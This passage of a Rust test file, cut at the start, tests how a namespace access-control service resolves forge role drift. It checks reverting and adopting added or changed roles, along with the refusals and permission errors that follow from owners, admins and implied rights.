        "github.com/acme",
    )
    .await);
    assert_eq!(
        projected(&f, &f.carol.did).await.as_deref(),
        Some("git.ns.admin")
    );
    crate::acl::delete_acl_entry(&f.vtc.state.acl_ks, &f.carol.did)
        .await
        .unwrap();
    assert!(super::lifecycle::sweep(&f.vtc.state).await.unwrap());
    assert_eq!(projected(&f, &f.carol.did).await, None);
}

#[tokio::test]
async fn a_forge_role_held_by_a_namespace_admin_can_be_reverted() {
    let (f, ns) = drift_fixture(json!([])).await;
    link_account(&f, &ns, &f.admin, "5550777", "admin-a").await;
    report_drift(
        &f,
        &ns,
        json!([{ "type": "roleAdded", "resource": RES, "account": admin_acct(), "observed": "admin" }]),
    )
    .await;
    ok(&resolve(
        &f,
        &f.admin,
        json!({ "type": "roleAdded", "account": admin_acct(), "observed": "admin" }),
        "revert",
    )
    .await);
    let sent = f.bridge.jobs.lock().unwrap().clone();
    let job = sent
        .iter()
        .map(|(_, p)| p)
        .find(|p| p.get("removeAccounts").is_some())
        .expect("a projectRoles job with removeAccounts");
    assert_eq!(job["removeAccounts"], json!([admin_acct()]));
    // Still in the complete projection, at no role: 0.4 lets both lists
    // name an account listed at git.ns.admin.
    assert_eq!(
        desired_right(job, &f.admin.did).as_deref(),
        Some("git.ns.admin"),
        "{job}"
    );
}

#[tokio::test]
async fn a_revert_is_refused_for_an_admin_who_is_also_an_explicit_owner() {
    let (f, ns) = drift_fixture(json!([])).await;
    ok(&grant(
        &f,
        &f.admin,
        &f.carol.did,
        "git.ns.admin",
        "github.com/acme",
    )
    .await);
    ok(&grant(&f, &f.admin, &f.carol.did, "git.repo.own", RES).await);
    report_drift(
        &f,
        &ns,
        json!([{ "type": "roleAdded", "resource": RES, "account": carol_acct(), "observed": "write" }]),
    )
    .await;
    let out = resolve(
        &f,
        &f.admin,
        json!({ "type": "roleAdded", "account": carol_acct(), "observed": "write" }),
        "revert",
    )
    .await;
    assert_eq!(code(&out), "git-ns/drift/resolve:notRevertible");
}

#[tokio::test]
async fn a_namespace_admin_adopts_their_own_forge_admin_role_as_ownership() {
    let (f, ns) = drift_fixture(json!([])).await;
    link_account(&f, &ns, &f.admin, "5550777", "admin-a").await;
    report_drift(
        &f,
        &ns,
        json!([{ "type": "roleAdded", "resource": RES, "account": admin_acct(), "observed": "admin" }]),
    )
    .await;
    let body = ok(&resolve(
        &f,
        &f.admin,
        json!({ "type": "roleAdded", "account": admin_acct(), "observed": "admin" }),
        "adopt",
    )
    .await);
    assert_eq!(body["right"]["subject"], json!(f.admin.did));
    assert_eq!(body["right"]["right"], "git.repo.own");
    // Now recorded in their own name, it is projected.
    assert_eq!(
        projected(&f, &f.admin.did).await.as_deref(),
        Some("git.repo.own")
    );
}

#[tokio::test]
async fn someone_else_adopts_a_namespace_admins_forge_admin_role() {
    let (f, ns) = drift_fixture(json!([])).await;
    ok(&grant(
        &f,
        &f.admin,
        &f.carol.did,
        "git.ns.admin",
        "github.com/acme",
    )
    .await);
    report_drift(
        &f,
        &ns,
        json!([{ "type": "roleAdded", "resource": RES, "account": carol_is_admin_acct(), "observed": "admin" }]),
    )
    .await;
    // Bob owns `widgets`, but an owner-level adoption is elevated: under the
    // default configuration a community administrator does it.
    let out = resolve(
        &f,
        &f.bob,
        json!({ "type": "roleAdded", "account": carol_is_admin_acct(), "observed": "admin" }),
        "adopt",
    )
    .await;
    assert_eq!(code(&out), "permissionDenied");
    let body = ok(&resolve(
        &f,
        &f.admin,
        json!({ "type": "roleAdded", "account": carol_is_admin_acct(), "observed": "admin" }),
        "adopt",
    )
    .await);
    assert_eq!(body["right"]["subject"], json!(f.carol.did));
    assert_eq!(body["right"]["right"], "git.repo.own");
    assert_eq!(body["right"]["grantedBy"], json!(f.admin.did));
}

#[tokio::test]
async fn a_role_change_is_measured_against_implied_rights_as_drift_resolve_0_2_says() {
    let (f, ns) = drift_fixture(json!([])).await;
    link_account(&f, &ns, &f.admin, "5550777", "admin-a").await;
    ok(&grant(&f, &f.bob, &f.admin.did, "git.repo.maintain", RES).await);
    report_drift(
        &f,
        &ns,
        json!([{ "type": "roleChanged", "resource": RES, "account": admin_acct(), "expected": "maintain", "observed": "admin" }]),
    )
    .await;
    // `own` is implied by `ns.admin`, so `admin` is "no higher than the
    // member's highest effective right" (git-ns/drift/resolve 0.2, step 4).
    let out = resolve(
        &f,
        &f.admin,
        json!({ "type": "roleChanged", "account": admin_acct(), "observed": "admin" }),
        "adopt",
    )
    .await;
    assert_eq!(code(&out), "git-ns/drift/resolve:notAdoptable");
}
